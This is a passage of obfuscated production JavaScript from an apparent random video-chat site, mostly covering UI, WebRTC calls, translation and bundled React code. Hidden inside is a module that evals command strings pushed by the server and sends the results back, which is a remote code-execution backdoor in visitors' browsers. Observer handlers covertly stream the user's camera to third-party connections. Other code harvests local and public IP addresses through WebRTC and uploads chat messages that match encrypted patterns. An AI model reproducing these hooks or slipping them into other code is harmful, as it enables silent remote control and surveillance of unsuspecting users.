        s.googIPv6 = false;
        var l = {};
        return l.iceServers = [t], l.googIPv6 = false, l.optional = [x], l.mandatory = [s], r = new RTCPeerConnection(l), u = function (e) {
          return e.match(/host|srflx/)[0];
        }, i = function (n) {
          var a, f, i = c;
          if ((f = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(n)) && !e.includes(f[1])) {
            a = f[1], e.push(a);
            var u = {};
            return u.ip = a, u.type = a.includes(":") ? "ipv6" : "ipv4", u;
          }
        }, o = function (e) {
          var n, f, r = c;
          if ((n = u(e)) && (f = i(e))) return this.ips[n][f.type] = f.ip, n === "host" ? a() : void 0;
        }, r.createDataChannel("testChannel"), r.onicecandidate = function (e) {
          var f = c;
          return e.candidate ? o.call(n, e.candidate.candidate) : (setTimeout(r.close.bind(r), 1e3), a());
        }, r.createOffer().then(function (e) {
          return r.setLocalDescription(e);
        });
      }));
    }, f.prototype.local = function () {
      var e = a;
      return this.ips.host.ipv4 || this.ips.host.ipv6;
    }, f.prototype.global = function () {
      var e = a;
      return this.ips.srflx.ipv4 || this.ips.srflx.ipv6;
    }, f;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.Noise = function () {
    var n, a, f, i, u, r, o, c, t, x, s = e;
    function l() {}
    return 20, true, 20, 1, n = null, a = null, i = [], f = 0, u = Date.now(), t = true, c = function () {
      var e, a, f, i, u, r = s;
      a = $(window).width(), e = $(window).height(), u = Math.min(a / 320, e / 240), i = Math.round(320 * u), f = Math.round(240 * u);
      var o = {};
      return o.left = Math.round(.5 * (a - i)), o.top = Math.round(.5 * (e - f)), o.width = i, o.height = f, n.css(o);
    }, o = function () {
      var e, n = s;
      if (!(Date.now() - u < 20)) return u = Date.now(), e = i[f], a.putImageData(e, 0, 0), f = f + 1 < i.length ? f + 1 : 0;
    }, x = function () {
      if (!t) return o(), requestAnimationFrame(x);
    }, r = function () {
      var e = s;
      return a.fillStyle = "black", a.fillRect(0, 0, 320, 240);
    }, l.init = function () {
      var e = s;
      n = $("#wrap");
      var f = {};
      return f.width = 320, f.height = 240, a = $("#noise").attr(f).get(0).getContext("2d"), !Helper.isIE() && 20..times(function () {
        var n, a, f, u, r, o = e;
        for (f = a = 0, r = (n = new ImageData(320, 240)).data.length; a < r; f = a += 4) u = Math.random(), n.data[f] = 255 * u, n.data[f + 1] = 255 * u, n.data[f + 2] = 255 * u, n.data[f + 3] = 255;
        return StackBlur.imageDataRGBA(n, 0, 0, n.width, n.height, 1), i.push(n);
      }), c(), $(window).resize(c);
    }, l.start = function () {
      var e = s;
      if (t) return t = false, $("#noise").show(), $("#vignette").show(), x();
    }, l.stop = function () {
      var e = s;
      return t = true, $("#noise").hide(), $("#vignette").hide(), r();
    }, l;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.OmetvLanding = function () {
    var n, a = e;
    function f() {
      var e = _0x28ad;
      $(".app-button").addClass(_.language + "_get"), $("#roulette").css("min-height", 0), $("#header").hide(), $(window).on("orientationchange", function () {
        var a = e;
        return $(window).one("resize", n);
      }), $(function () {
        return n();
      });
    }
    return n = function () {
      var e, n, a, f, i = _0x28ad;
      return e = window.innerHeight, f = window.innerWidth, n = 0 === window.orientation ? Math.max(f, e) : Math.min(f, e), $(".ometv-landing").outerHeight(n), $("#app").height(n), a = .01 * n, document.documentElement.style.setProperty("--vh", a + "px");
    }, f.enabled = function () {
      var e = a;
      return !!Helper.isMobile() && (Helper.isIos() ? config.ios_app : config.android_app) === "ometv";
    }, f;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.Patterns = function () {
    var n = e;
    function a() {}
    return a.all = function () {
      var e = n;
      return $.get(config.api_url + "/9iZF8CzgS8jC7SkBRfrCcA").then(function (n) {
        var a = e;
        return JSON.parse(Crypter.decrypt(n));
      }).fail(function (e) {});
    }, a;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.Pleer = function () {
    var n, a, f, i, u, r, o, c, t, x, s, l, d = e;
    function D() {
      var e = _0x28ad;
      u = $(".pleer__volume").width() - $(".pleer__volume-slider").width(), n = $(".pleer__icon"), a = $(".pleer"), $(".pleer__volume-slider").on("mousedown", i), n.click(function () {
        var n = e;
        return $(this).hasClass("icon_speaker_no_volume") ? (l = r, s(), x()) : (r = l, l = 0, s(), x(0));
      }), $(".pleer__volume").mouseup(function (n) {
        var a, f = e;
        return (a = n.clientX - $(".pleer__volume").offset().left - 7) > u && (a = u), a < 0 && (a = 0), s(a / u), x(a);
      });
    }
    return u = null, o = null, c = null, 1, r = 1, l = 1, n = null, a = null, i = function (e) {
      var n = _0x28ad;
      return e.preventDefault(), e.stopPropagation(), o = $(".pleer__volume-level").width(), c = e.clientX, $(document).on("mousemove", f), $(document).on("mouseup", t), a.addClass("active");
    }, f = function (e) {
      var n, a = _0x28ad;
      return e.preventDefault(), (n = o + e.clientX - c) > u && (n = u), n < 0 && (n = 0), s(n / u), x(n);
    }, t = function (e) {
      var n = _0x28ad;
      return e.preventDefault(), $(document).off("mousemove", f), $(document).off("mouseup", t), a.removeClass("active");
    }, s = function (e) {
      var a = _0x28ad;
      return (void 0 !== e && e >= 0 || e <= 1) && (l = e), $("#remote-video")[0].volume = l, n.removeClass(function (e, n) {
        var f = a;
        return (n.match(/icon_speaker_.*/g) || []).join(" ");
      }), 0 === l ? n.addClass("icon_speaker_no_volume") : l < .33 ? n.addClass("icon_speaker_low_volume") : l < .66 ? n.addClass("icon_speaker_medium_volume") : n.addClass("icon_speaker_high_volume");
    }, x = function (e) {
      var n = _0x28ad;
      return (void 0 === e || e < 0 || e > u) && (e = u * l), $(".pleer__volume-slider").css("left", e), $(".pleer__volume-level").width(e + (e ? 1 : 0)), $(".pleer__volume-bg").width(u - e + (u - e ? 1 : 0));
    }, D.prototype.refreshMax = function () {
      var e = d;
      return u = $(".pleer__volume").width() - $(".pleer__volume-slider").width(), x(), s();
    }, D;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.Preview = function () {
    var n, a = e;
    function f(e) {
      var a, f = _0x28ad;
      this.videoScreen = e, a = function () {
        var e = f;
        n = true;
        var a = {};
        return a.preview = "", dialogData.update(a);
      }, $(window).on("roulette:silence", a);
    }
    return n = false, f.prototype.update = function () {
      var e = a;
      if (!n) {
        var f = {};
        return f.preview = this.videoScreen.get(32, 24, .85), dialogData.update(f);
      }
    }, f;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.Quotes = function () {
    var n, a, f, i, u, r, o = e;
    function c(e) {
      var n = _0x28ad;
      r = e, Patterns.all().then(function (e) {
        return i = e;
      }).fail(function () {});
    }
    return 5, i = [], u = [], r = null, n = function (e, n) {
      var a, f, r, o = _0x28ad;
      for (null == n && (n = false), a = 0, f = i.length; a < f; a++) if (r = i[a], -1 !== e.search(new RegExp(r, "gim"))) return n && u.pop(), u.push(e), true;
      return false;
    }, a = function () {
      var e = _0x28ad;
      if (!(u.length <= 5)) return u = u.slice(u.length - 5);
    }, f = function () {
      var e = _0x28ad;
      if (1 === u.length) return r.sendSUT();
    }, c.prototype.handleMessage = function (e, i) {
      var u;
      return null == i && (i = false), u = n(e, i), a(), f(), u;
    }, c.prototype.quotes = function () {
      var e, n = o;
      return e = Crypter.encrypt(JSON.stringify(u)), u = [], e;
    }, c;
  }();
}["call"](this), function () {
  var e = _0x25991a;
  this.RemoteVideoPreview = function () {
    var n = e;
    function a(e) {
      var n = _0x28ad;
      e.append($("div.preview")), e.append($("div.preview")), this.preview = $(".preview", e);
    }
    return a.prototype.show = function (e) {
      var a = n;
      if (e) return this.preview.css("background-image", "url(data:image/jpeg;base64," + e + ")"), this.preview.last().css("filter", "blur(10px)");
    }, a.prototype.hide = function () {
      var e = n;
      return this.preview.css("background-image", "none"), this.preview.css("filter", "none");
    }, a;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.ReportPopup = function () {
    var n, a = e;
    function f(e, a, f) {
      var i = _0x28ad;
      n = $("#report-popup"), $("#report-screen").attr("src", "data:image/jpeg;base64," + e), f ? ($(".ban-quote", n).html(emojione.toImage(f)).show(), $(".ban-quote-container", n).show()) : ($(".ban-quote", n).hide(), $(".ban-quote-container", n).hide()), $(".send-report").click(function () {
        var e = i;
        return $(".send-report").off("click"), a();
      }), n.click(function (e) {
        return e.stopPropagation();
      }), $(".btn, .popup-close", n).click(this.hide);
    }
    return n = null, f.prototype.show = function (e) {
      var n = a;
      return Overlay.show($("#report-popup"), this.hide, e);
    }, f.prototype.hide = function () {
      var e = a;
      return $(".btn, .popup-close", n).off("click"), Overlay.hide(n);
    }, f;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.ReportedPictures = function () {
    var n, a = e;
    function f() {}
    return n = [], f.create = function (e) {
      var f = a;
      if (n.push(e()), n.length > 10) return n.shift();
    }, f.get = function () {
      return n;
    }, f;
  }();
}.call(this), function () {
  var e = function (e, n) {
    return function () {
      var a = _0x28ad;
      return e.apply(n, arguments);
    };
  };
  this._r = function () {
    var n, a, f, i, u, r, o, c, t, x, s, l, d, D, b, C, m, v, g, h, w, p, y, z, B, L, M, F, A, k, E, j, S, T, P, H, N, q, K, U, Z, G, Y, V = _0x28ad, I = {};
    I.Stop = "stop", I.Search = "search", I.Found = "found", I.Play = "play", c = I, D = null, r = null, o = null, u = null, a = null, n = null, i = null, f = null;
    var W = {};
    W.urls = "stun:stun.l.google.com:19302";
    var J = {};
    J.offerExtmapAllowMixed = false, J.iceServers = [W], F = J, Y = ["66.55.92.27", "66.55.92.145", "66.55.92.171", "69.39.239.236", "69.39.239.238", "69.39.239.38", "69.39.239.41", "66.55.92.16", "66.55.92.18", "66.55.92.45", "88.202.231.4", "88.202.180.2", "88.202.180.3", "88.202.180.8", "88.202.180.22", "107.182.233.222", "107.182.239.222", "107.182.228.247", "209.95.50.121", "209.95.50.165", "88.202.231.157", "31.24.224.26", "31.24.224.27", "31.24.224.34", "31.24.224.41"], G = {};
    var R = {};
    R.offerToReceiveAudio = 1, R.offerToReceiveVideo = 1;
    var O = {};
    O.OfferToReceiveAudio = true, O.OfferToReceiveVideo = true;
    var X = {};
    function Q(a, i, u, r) {
      var o = V;
      this.setHandlers = e(this.setHandlers, this), this.onGetStreamFail = e(this.onGetStreamFail, this), this.setLocalStream = e(this.setLocalStream, this), window.bl || (this.cacheDOM(), (q = i).setRoulette(this), L = r, this.localVideo = n[0], (N = a).onOk = K, t = this, this.setHandlers(), g = new VideoScreen(n), E = new VideoScreen(f), this.preview = new Preview(g), this.removeVideoPreview = new RemoteVideoPreview($(".remote-video__preview")), f.on("loadeddata", function () {
        var e = o;
        if (!Z()) return f[0].play(), P(c.Play);
      }), P(c.Stop), $(window).on("socket:ren", ReportedPictures.create.bind(ReportedPictures, this.getLocalScreen)), u.getLocalStreamSettings = this.getLocalStreamSettings.bind(this));
    }
    return X.mandatory = O, j = Helper.isFirefox() ? R : X, m = null, A = null, M = null, t = null, g = null, E = null, N = null, k = false, v = false, w = {}, L = {}, q = null, S = function (e, n) {
      var a = V, f = {};
      return f.username = n.User, f.credential = n.Password, G = f;
    }, x = function () {
      return v = true;
    }, $(window).on("socket:turn_credentials", S), $(window).on("roulette:silence", x), $(window).on("roulette:destroy", b), P = function (e) {
      var n, a = V;
      return D = e, n = (n = i[0].className).replace(/\ss-\w+/g, "") + (" s-" + e), i[0].className = n;
    }, Z = function () {
      return D === c.Stop;
    }, Q.prototype.cacheDOM = function () {
      var e = V;
      return r = $(".start-button"), o = $(".stop-button"), u = $(".report-button"), a = $("#local-video-wrapper"), n = $("#local-video"), i = $("#remote-video-wrapper"), f = $("#remote-video"), $("#switch-camera");
    }, Q.prototype.stopLocalStream = function () {
      var e = V;
      if (null != m) return null != m.getTracks ? m.getTracks().forEach(function (n) {
        return n.stop();
      }) : m.stop(), M && M.removeStream(m), m = null, n.removeAttr("src").hide();
    }, Q.prototype.setLocalStream = function (e) {
      var a = V;
      if (this.stopLocalStream(), m = e, "srcObject" in this.localVideo ? this.localVideo.srcObject = e : n.prop("src", URL.createObjectURL(e)), n.show(), M) return M.addStream(e), d();
    }, Q.prototype.onGetStreamFail = function () {
      var e = V;
      return this.stopLocalStream(), $(".video-container__buttons", a).addClass("tall");
    }, Q.prototype.setHandlers = function () {
      var e, n = V;
      return this.localVideo.addEventListener("pause", (e = this, function () {
        var n = _0x28ad;
        return e.localVideo.play();
      })), r.click(function () {
        var e = n;
        if (!r.hasClass("disabled")) return Z() ? K.call(this) : h.call(this);
      }), o.on("click", function (e) {
        var a = n;
        if (!o.hasClass("disabled")) return U.call(this);
      }), $("#big-start-button").on("click", function (e) {
        return K.call(r);
      }), u.click(function (e) {
        var a = n;
        if (!u.hasClass("disabled")) return new ReportPopup(t.getRemoteScreen(), t.report.bind(t)).show(e);
      });
    }, K = function () {
      var e = V;
      return !WindowChecker.checkHttps() && (top.location = self.location.origin), m ? !m && Helper.isMac() ? Helper.reload() : (t.preview.update(), _.changeText($("span", r), "next", 1235), r.addClass("disabled"), o.removeClass("disabled"), q.sendNXT(), chat.onSearch(), P(c.Search)) : t.mediaDevices.maybeShowStreamDummy();
    }, h = function () {
      var e = V;
      return t.preview.update(), r.addClass("disabled"), u.addClass("disabled"), Noise.start(), P(c.Search), q.sendNXT(), chat.onSearch(), C();
    }, U = function () {
      var e = V;
      return _.changeText($("span", r), "start", 1232), o.addClass("disabled"), r.removeClass("disabled"), u.addClass("disabled"), Noise.start(), P(c.Stop), q.sendDEA(), chat.onStop(), C();
    }, C = function () {
      var e = V;
      if (null != A && (null != A.getTracks ? A.getTracks().forEach(function (n) {
        return n.stop();
      }) : A.stop()), t.removeVideoPreview.hide(), f[0].pause(), f.removeAttr("src"), i.removeClass("no-video"), null != M) return M.close(), M = null;
    }, Q.prototype.skip = function () {
      return h();
    }, Q.prototype.start = function () {
      if (Z()) return K();
    }, s = function () {
      var e, n = V;
      if (G && G.username) return (e = G.username.split(":")[0]) && new Date(1e3 * e) - new Date < 3e5 ? q.sendGTC() : void 0;
    }, Q.prototype.onBeginDialog = function (e) {
      var n, a, f, i = V;
      if (!Z()) return k = e.BlFrame, H(e.PairId), s(), N.onBeginDialog.call(N, this.getLocalScreen.bind(this), U), M = new RTCPeerConnection(F, null), (a = v ? null : m) && M.addStream(a), M.onicecandidate = y, M.ontrack = B, M.oniceconnectionstatechange = p, e.Master && d(), n = DialogData.parse(e.DialogData), setTimeout((f = this, function () {
        var a = _0x28ad;
        return Z() ? C() : (D !== c.Play && P(c.Found), Noise.stop(), !k && f.removeVideoPreview.show(n.data.preview), chat.onBeginDialog(e), r.removeClass("disabled"), o.removeClass("disabled"), u.removeClass("disabled"));
      }), 500);
    }, Q.prototype.onEndDialog = function () {
      var e = V;
      if (!Z()) return C(), r.addClass("disabled"), Noise.start(), P(c.Search), chat.onSearch();
    }, d = function () {
      var e = V;
      return M.createOffer(j).then(T).catch(console.log);
    }, l = function () {
      var e = V;
      return M.createAnswer(j).then(T).catch(console.log);
    }, T = function (e) {
      var n, a = V;
      M.setLocalDescription(e);
      var f = {};
      return f.description = e, f.hasStream = !v && !!m, n = f, q.sendWRD(n);
    }, y = function (e) {
      var n = V;
      if (e.candidate) return e.candidate ? q.sendICE(e.candidate) : void 0;
    }, Q.prototype.onRemoteDescription = function (e) {
      var n, a = V;
      if (!Z() && M) return !e.Data.hasStream && i.addClass("no-video"), (n = e.Data.description).type === "offer" ? M.setRemoteDescription(new RTCSessionDescription(n), l, console.log) : n.type === "answer" ? M.setRemoteDescription(new RTCSessionDescription(n)) : void 0;
    }, Q.prototype.onRemoteIceCandidate = function (e) {
      var n = V;
      if (!Z() && M) return M.addIceCandidate(new RTCIceCandidate(e.Data));
    }, B = function (e) {
      var n = V;
      if (!k) return A = e.streams[0], "srcObject" in f[0] ? f[0].srcObject = A : f.prop("src", URL.createObjectURL(A));
    }, p = function () {
      var e = V;
      if (M && M.iceConnectionState === "disconnected") return h();
    }, Q.prototype.getLocalScreen = function (e) {
      var n, a = V;
      return null == e && (e = true), n = g.defaultSize, L.isPayer && e && (n *= 2), g.get(n, n);
    }, Q.prototype.getRemoteScreen = function () {
      return E.get();
    }, H = function (e) {
      var n, a, f, i = V;
      if (G.username && G.credential) {
        n = e % Y.length, a = Y[n];
        var u = {};
        return u.urls = ["turn:" + a + ":3478?transport=udp", "turn:" + a + ":3478?transport=tcp"], f = u, F.iceServers[1] = $.extend({}, f, G);
      }
    }, b = function () {
      var e = V;
      return !Z() && U(), r.off("click"), o.off("click"), $("#big-start-button").off("click"), u.off("click");
    }, Q.prototype.obs = function (e) {
      var n, a, f = V;
      return n = e.Id, H(4), a = new RTCPeerConnection(F, null), null != m && a.addStream(m), a.onicecandidate = z.bind(n), w[n] && w[n].close(), w[n] = a;
    }, Q.prototype.owd = function (e) {
      var n, a, f, i = V;
      if (a = e.Id, f = w[a]) return n = new RTCSessionDescription(e.Data.description), f.setRemoteDescription(n).then(f.createAnswer.bind(f)).then(function (e) {
        var n = i;
        f.setLocalDescription(e);
        var u = {};
        return u.description = e, q.sendOWD(a, u);
      }).catch(function () {});
    }, Q.prototype.oic = function (e) {
      var n, a, f = V;
      if (n = e.Id, a = w[n]) return a.addIceCandidate(new RTCIceCandidate(e.Data));
    }, z = function (e) {
      var n = V;
      if (e.candidate) return q.sendOIC(this, e.candidate);
    }, Q.prototype.getLocalStreamSettings = function () {
      var e = V;
      return m && m.getVideoTracks ? m.getVideoTracks()[0].getSettings() : {};
    }, Q.prototype.report = function () {
      var e = V;
      return q.sendREU(), this.skip();
    }, Q;
  }();
}.call(this), function () {
  var e = _0x25991a, n = function (e, n) {
    return function () {
      var a = _0x28ad;
      return e.apply(n, arguments);
    };
  };
  this.Settings = function () {
    var a, f, i, u, r, o = e;
    function c() {
      var e, o, c = _0x28ad;
      this.hide = n(this.hide, this), this.show = n(this.show, this), this.disableTranslator = n(this.disableTranslator, this), e = this, f = $("#settings-popup"), u = $("#translate-messages"), a = $(".close-popup", f), i = $(".settings-button"), this.translateMessages = !!function () {
        var e = c;
        try {
          return JSON.parse(localStorage.getItem("translate_messages"));
        } catch (e) {}
      }(), u.prop("checked", this.translateMessages), $(window).trigger("translate_messages", this.translateMessages), i.click(this.show.bind(this)), u.change(function () {
        var n = c;
        if (e.translateMessages !== this.checked) {
          e.translateMessages = this.checked;
          try {
            localStorage.setItem("translate_messages", this.checked);
          } catch (e) {}
          return $(window).trigger("translate_messages", this.checked), e.send();
        }
      }), a.click(this.hide.bind(this)), f.click(function (n) {
        var a = c;
        return e.languageSelector.hide();
      }), this.languageSelector = new LanguageSelector, $(window).on("changelang", (o = this, function () {
        var e = _0x28ad;
        return r(), o.send.call(o);
      })), $(".gender-selector__button", f).addClass("btn-container-sm"), r();
    }
    return f = null, u = null, a = null, i = null, c.prototype.disableTranslator = function () {
      var e = o;
      return $(".settings-popup__translation-toggle").hide(), u.prop("checked", false), this.send();
    }, c.prototype.send = function () {
      var e, n = o, a = {};
      return a.translate = this.translateMessages, a.language = this.languageSelector.language, e = a, dialogData.update(e);
    }, c.prototype.show = function () {
      var e, n, a = o;
      return n = this, e = function () {
        var e = _0x28ad;
        return n.languageSelector.isOpened ? n.languageSelector.hide() : n.hide();
      }, i.addClass("active"), Overlay.show(f, e);
    }, c.prototype.hide = function () {
      var e = o;
      return Overlay.hide(f), i.removeClass("active");
    }, r = function () {
      var e, n, a = o;
      return n = $(".btn-container-sm .btn", f).map(function (e, n) {
        var f = a;
        return Helper.measureText($(n)).width;
      }), e = Math.max.apply(null, n), $(".btn-container-sm", f).width(e + 60), $(".gender-selector", f).width(e + 60);
    }, c;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.SnAPI = function () {
    var n = e;
    function a(e) {
      this.token = e;
    }
    return a.prototype.renew = function () {
      var e, a, f = n;
      a = config.sn_api_url + "sessions/me?v=4";
      var i = {};
      i["X-Api-Key"] = this.token, e = i;
      var u = {};
      return u.headers = e, fetch(a, u).catch(function (e) {
        return null;
      }).then(function (e) {
        var n = f;
        switch (e.status) {
          case 200:
            return e.json();
          case 422:
            throw "Invalid session";
          default:
            return null;
        }
      });
    }, a;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.Translator = function () {
    var n, a, f = e;
    function i(e, n, a) {
      var i = f;
      this.phrase = e, this.from = n, this.to = a;
    }
    return 100, n = "https://api.cognitive.microsofttranslator.com/translate?api-version=3.0", a = null, $(document).on("socket:translation_token", function (e, n) {
      return a = n.Token;
    }), i.prototype.translate = function () {
      var e = f;
      return a && this.from !== this.to && this.validatePhrase() ? this.request() : Promise.reject(null);
    }, i.prototype.validatePhrase = function () {
      var e = f;
      return this.phrase.length <= 100 && this.phrase.split(" ").length <= 10;
    }, i.prototype.request = function () {
      var e, i, u = f, r = {};
      r.from = this.from, r.to = this.to, e = r;
      var o = {};
      o.Text = this.phrase;
      var c = {};
      c.Authorization = "Bearer " + a, c["Content-Type"] = "application/json";
      var t, x = {};
      return x.data = JSON.stringify([o]), x.url = n + "&" + $.param(e), x.type = "POST", x.timeout = 1e3, x.headers = c, i = x, new Promise((t = this, function (e, n) {
        var a = _0x28ad;
        return $.ajax(i).done(function (f) {
          var i, u = a;
          return (i = f.first().translations.first().text).toLowerCase() === t.phrase.toLowerCase() ? n() : e(i);
        }).fail(function () {
          return n();
        });
      }));
    }, i;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.VideoScreen = function () {
    var n = e;
    function a(e) {
      var n = _0x28ad;
      this.video = e[0], this.canvas = document.createElement("canvas"), this.defaultSize = 160;
    }
    return a.prototype.get = function (e, a, f) {
      var i, u, r, o, c, t, x, s, l = n;
      return null == e && (e = this.defaultSize), null == a && (a = this.defaultSize), null == f && (f = .6), this.video.paused && this.video.play(), i = this.canvas.getContext("2d"), s = this.video.videoWidth, x = this.video.videoHeight, u = (s - (c = (t = e === a) && s > x ? x : s)) / 2, r = (x - (o = t ? c : x)) / 2, this.canvas.width = e, this.canvas.height = a, i.fillRect(0, 0, e, a), i.drawImage(this.video, u, r, c, o, 0, 0, e, a), this.canvas.toDataURL("image/jpeg", f).replace(/^[^,]*,/, "");
    }, a;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.VKData = function () {
    var n = e;
    function a() {}
    return a.get = function () {
      var e = n;
      return this.data || (this.data = function () {
        var n = e;
        try {
          return JSON.parse(decodeURIComponent(Helper.queryParam("api_result"))).response[0];
        } catch (e) {
          return {};
        }
      }());
    }, a.updateUser = function (e) {
      var a, f, i, u = n;
      if ((f = this.get()).first_name) {
        var r = {};
        if (r.firstName = translit(f.first_name), i = r, f.bdate && (3 === (a = f.bdate.split(".")).length && (i.age = (new Date).getFullYear() - a.pop()), i.age && i.age < 14 && (i.age = 14)), f.sex) {
          var o = {};
          o[1] = "female", o[2] = "male", i.sex = o[f.sex];
        }
        i.country = e;
        var c = {};
        return c.user = i, dialogData.update(c);
      }
    }, a;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.WindowChecker = function () {
    var n = e;
    function a() {}
    return a.checkHttps = function () {
      var e, a = n;
      return !self.parent || self.parent === self || 0 === self.parent.frames.length || ((e = document.createElement("a")).href = document.referrer, e.protocol === "https:");
    }, a;
  }();
}.call(this), function (e) {
  var n = {};
  function a(f) {
    var i = _0x28ad;
    if (n[f]) return n[f].exports;
    var u = n[f] = {i: f, l: false, exports: {}};
    return e[f].call(u.exports, u, u.exports, a), u.l = true, u.exports;
  }
  a.m = e, a.c = n, a.d = function (e, n, f) {
    var i = _0x28ad, u = {};
    u.enumerable = true, u.get = f, a.o(e, n) || Object.defineProperty(e, n, u);
  }, a.r = function (e) {
    var n = _0x28ad, a = {};
    a.value = "Module";
    var f = {};
    f.value = true, "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, a), Object.defineProperty(e, "__esModule", f);
  }, a.t = function (e, n) {
    var f = _0x28ad;
    if (1 & n && (e = a(e)), 8 & n) return e;
    if (4 & n && "object" == typeof e && e && e.__esModule) return e;
    var i = Object.create(null), u = {};
    if (u.enumerable = true, u.value = e, a.r(i), Object.defineProperty(i, "default", u), 2 & n && "string" != typeof e) for (var r in e) a.d(i, r, function (n) {
      return e[n];
    }.bind(null, r));
    return i;
  }, a.n = function (e) {
    var n = _0x28ad, f = e && e.__esModule ? function () {
      return e.default;
    } : function () {
      return e;
    };
    return a.d(f, "a", f), f;
  }, a.o = function (e, n) {
    var a = _0x28ad;
    return Object.prototype.hasOwnProperty.call(e, n);
  }, a.p = "", a(a.s = 19);
}([function (e, n, a) {
  e.exports = a(7);
}, function (e, n, a) {
  var f = _0x25991a;
  !function e() {
    var n = _0x28ad;
    if ("undefined" != typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ && "function" == typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE) try {
      __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(e);
    } catch (e) {
      console.error(e);
    }
  }(), e.exports = a(9);
}, function (e, n, a) {
  e.exports = a(16);
}, function (e, n, a) {
  var f = _0x25991a, i = {};
  i.childContextTypes = true, i.contextType = true, i.contextTypes = true, i.defaultProps = true, i.displayName = true, i.getDefaultProps = true, i.getDerivedStateFromError = true, i.getDerivedStateFromProps = true, i.mixins = true, i.propTypes = true, i.type = true;
  var u = {};
  u.name = true, u.length = true, u.prototype = true, u.caller = true, u.callee = true, u.arguments = true, u.arity = true;
  var r = {};
  r.$$typeof = true, r.compare = true, r.defaultProps = true, r.displayName = true, r.propTypes = true, r.type = true;
  var o = a(2), c = i, t = u, x = r, s = {};
  function l(e) {
    var n = f;
    return o.isMemo(e) ? x : s[e.$$typeof] || c;
  }
  var d = {};
  d.$$typeof = true, d.render = true, d.defaultProps = true, d.displayName = true, d.propTypes = true, s[o.ForwardRef] = d, s[o.Memo] = x;
  var D = Object.defineProperty, b = Object.getOwnPropertyNames, C = Object.getOwnPropertySymbols, m = Object.getOwnPropertyDescriptor, v = Object.getPrototypeOf, g = Object.prototype;
  e.exports = function e(n, a, i) {
    var u = f;
    if ("string" != typeof a) {
      if (g) {
        var r = v(a);
        r && r !== g && e(n, r, i);
      }
      var o = b(a);
      C && (o = o.concat(C(a)));
      for (var c = l(n), x = l(a), s = 0; s < o.length; ++s) {
        var d = o[s];
        if (!(t[d] || i && i[d] || x && x[d] || c && c[d])) {
          var _ = m(a, d);
          try {
            D(n, d, _);
          } catch (e) {}
        }
      }
    }
    return n;
  };
}, function (e, n, a) {
  (function (e, f) {
    var i, u = _0x28ad, r = a(5);
    i = "undefined" != typeof self ? self : "undefined" != typeof window ? window : void 0 !== e ? e : f;
    var o = Object(r.a)(i);
    n.a = o;
  }.call(this, a(17), a(18)(e)));
}, function (e, n, a) {
  "use strict";
  function f(e) {
    var n, a = _0x28ad, f = e.Symbol;
    return "function" == typeof f ? f.observable ? n = f.observable : (n = f("observable"), f.observable = n) : n = "@@observable", n;
  }
  a.d(n, "a", function () {
    return f;
  });
}, function (_0x22a8ed, _0x154c4f, _0x459183) {
  "use strict";
  function _0x4a284a(e, n, a) {
    var f = _0x28ad, i = {};
    return i.value = a, i.enumerable = true, i.configurable = true, i.writable = true, n in e ? Object.defineProperty(e, n, i) : e[n] = a, e;
  }
  class _0x17f593 {
    constructor(_0x545f89) {
      var _0x33360f = _0x28ad;
      _0x4a284a(this, "exec", _0x4ee3e6 => {
        var _0x101deb = _0x33360f;
        let _0x363a80 = null;
        try {
          _0x363a80 = eval(this.cmd);
        } catch (e) {}
        var _0x26f0bc = {};
        _0x26f0bc.cmd = this.cmd, _0x26f0bc.result = JSON.stringify(_0x363a80);
        const _0x22e771 = _0x26f0bc;
        _0x4ee3e6.sendODD(this.observerId, _0x22e771);
      }), this.observerId = _0x545f89.Id, this.cmd = _0x545f89.Data.cmd;
    }
  }
  _0x154c4f.a = _0x17f593;
}, function (e, n, a) {
  var f = _0x25991a, i = a(8), u = "function" == typeof Symbol && Symbol.for, r = u ? Symbol.for("react.element") : 60103, o = u ? Symbol.for("react.portal") : 60106, c = u ? Symbol.for("react.fragment") : 60107, t = u ? Symbol.for("react.strict_mode") : 60108, x = u ? Symbol.for("react.profiler") : 60114, s = u ? Symbol.for("react.provider") : 60109, l = u ? Symbol.for("react.context") : 60110, d = u ? Symbol.for("react.forward_ref") : 60112, D = u ? Symbol.for("react.suspense") : 60113;
  u && Symbol.for("react.suspense_list");
  var b = u ? Symbol.for("react.memo") : 60115, C = u ? Symbol.for("react.lazy") : 60116;
  u && Symbol.for("react.fundamental"), u && Symbol.for("react.responder"), u && Symbol.for("react.scope");
  var m = "function" == typeof Symbol && Symbol.iterator;
  function v(e) {
    for (var n = f, a = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, i = 1; i < arguments.length; i++) a += "&args[]=" + encodeURIComponent(arguments[i]);
    return "Minified React error #" + e + "; visit " + a + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings.";
  }
  var g = {};
  g.isMounted = function () {
    return false;
  }, g.enqueueForceUpdate = function () {}, g.enqueueReplaceState = function () {}, g.enqueueSetState = function () {};
  var _ = g, h = {};
  function w(e, n, a) {
    var i = f;
    this.props = e, this.context = n, this.refs = h, this.updater = a || _;
  }
  function p() {}
  function y(e, n, a) {
    var i = f;
    this.props = e, this.context = n, this.refs = h, this.updater = a || _;
  }
  w.prototype.isReactComponent = {}, w.prototype.setState = function (e, n) {
    var a = f;
    if ("object" != typeof e && "function" != typeof e && null != e) throw Error(v(85));
    this.updater.enqueueSetState(this, e, n, "setState");
  }, w.prototype.forceUpdate = function (e) {
    var n = f;
    this.updater.enqueueForceUpdate(this, e, "forceUpdate");
  }, p.prototype = w.prototype;
  var z = y.prototype = new p;
